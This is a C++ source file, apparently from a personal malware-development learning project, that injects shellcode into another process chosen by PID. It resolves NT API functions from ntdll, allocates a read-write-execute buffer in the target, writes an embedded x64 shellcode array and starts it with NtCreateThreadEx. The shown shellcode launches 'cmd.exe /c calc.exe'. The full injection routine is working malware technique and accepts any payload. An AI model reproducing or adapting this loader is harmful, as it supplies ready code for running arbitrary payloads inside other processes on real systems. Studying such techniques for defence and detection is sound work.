#include "importNTAPI.h"

//extern "C" DWORD CustomError(void);
//extern "C" PPEB GetPEB(void);

wchar_t dllPath[MAX_PATH] = L"C:\\Users\\dadn\\OneDrive\\Desktop\\Coding\\learning_malware_development\\dll-injection\\testDLL.dll";
size_t dllPathSize = sizeof(dllPath);

HMODULE GetMod (IN LPCWSTR modName){
    HMODULE hModule = NULL;

    info("trying to get handle to %S", modName);
    hModule = GetModuleHandleW(modName);

    if (hModule == NULL) {
        warn("failed to get a handle to the module, error: 0x%lx\n", GetLastError());
        return NULL;
    }
    else {
        okay("got handle to the module!");
        info("\\___[ %S\n\t\\__0x%p]\n", modName, hModule);
        return hModule;
    }
}

UINT_PTR GetNtFunctionAddress(
    _In_ LPCSTR FunctionName,
    _In_ CONST HMODULE ModuleHandle
) {

    UINT_PTR FunctionAddress = 0; 
    
    FunctionAddress = (UINT_PTR)GetProcAddress(ModuleHandle, FunctionName);
    if (0 == FunctionAddress) {
        warn("[GetProcAddress] failed, error: 0x%lx", GetLastError());
        return 0;
    }

    okay("[0x%p] -> %s!", (PVOID)FunctionAddress, FunctionName);
    return FunctionAddress;

}
    

int main(int argc, char* argv[]){

    if (argc < 2){
        warn("usage: %s <PID>", argv[0]);
        return 1;
    }

    DWORD       PID         = 0;
    NTSTATUS    STATUS      = 0;
    PVOID       rBuffer     = NULL;
    HMODULE     hNTDLL      = NULL;
    HANDLE      hThread     = NULL;
    HANDLE      hProcess    = NULL;

    PID = atoi(argv[1]);
    hNTDLL = GetMod(L"NTDLL");

    OBJECT_ATTRIBUTES OA;
    OA.Length = sizeof(OA);
    OA.RootDirectory = NULL;
    OA.ObjectName = NULL;  
    OA.Attributes = 0;   
    OA.SecurityDescriptor = NULL;
    OA.SecurityQualityOfService = NULL;

    CLIENT_ID CID;
    CID.UniqueProcess = (VOID*)(uintptr_t)PID;  // Assuming PID is the process ID you want to pass
    CID.UniqueThread = NULL;                
    //CID.UniqueProcess = (HANDLE)PID; Wields the same result (maybe)

    unsigned char payload[] = {"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"};
    size_t szPayload = sizeof(payload);

    info("populating function prototypes");
    NtOpenProcess    new_OpenProcess    = (NtOpenProcess)   GetNtFunctionAddress("NtOpenProcess"   , hNTDLL);
    NtCreateThreadEx new_CreateThreadEx = (NtCreateThreadEx)GetNtFunctionAddress("NtCreateThreadEx", hNTDLL);
    NtClose          new_Close          = (NtClose)         GetNtFunctionAddress("NtClose"         , hNTDLL);
    okay("prototypes created successfully");
    info("beggining injection");
    // you can change the name loaded in importNTAPI.h to something like dn_NtOpenProcess to differentiate
    // DONE work to do: create a new_CloseHandle -> alias new_Clone 
    // work to do: create a new_VirtualAlloc

    /*------------------------------------------[BEGIN INJECTION]------------------------------------------------*/

    STATUS = new_OpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
    if (STATUS != STATUS_SUCCESS) {
        warn("[new_NtOpenProcess] failed to get a handle to the process, error: 0x%lx", STATUS);
        goto CLEANSE;
    }
    okay("got handle to the process!\n\\---0x%p\n", hProcess);

    /*-------------------------------------------[ALLOCATE BUFFER]-----------------------------------------------*/

    info("allocating [RWX] buffer in process memory");
    rBuffer = VirtualAllocEx(hProcess, NULL, szPayload, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    // work to do: create a new_VirtualAlloc
    if (rBuffer == NULL) {
        warn("[VirtualAlloc] failed to allocate memory, error: 0x%lx", GetLastError());
        goto CLEANSE;
    }
    okay("allocated [RWX] buffer in process memory at 0x%p", rBuffer);

    /*---------------------------------------[WRITE SHELLCODE TO BUFFER]------------------------------------------*/

    info("writing to allocated buffer");
    WriteProcessMemory(hProcess, rBuffer, payload, szPayload, 0);

    STATUS = new_CreateThreadEx(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, rBuffer, NULL, 0, 0, 0, 0, NULL);
    // note that "...(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, rBuffer, NULL..." is NULL because we are not doing
    // simple dll injection in this case. 
    if (STATUS != STATUS_SUCCESS) {
        warn("[new_CreateThreadEx] failed to create a thread, error: 0x%lx", STATUS);
        goto CLEANSE;
    }
    okay("Thread created, started routine!");

    info("waiting for thread to finish executing");
    WaitForSingleObject(hThread, INFINITE);
    okay("thread finished executing");
    info("cleaning up allocated memory");

    /*--------------------------------------------------[CLEANSE]-------------------------------------------------*/

    CLEANSE:
    if (hThread){
        new_Close(hThread);
        info("Closed handle on thread");
    }
    if (hProcess){
        new_Close(hProcess);
        info("closed handle on process");
    }
    okay("program complete");
    return 0;
}
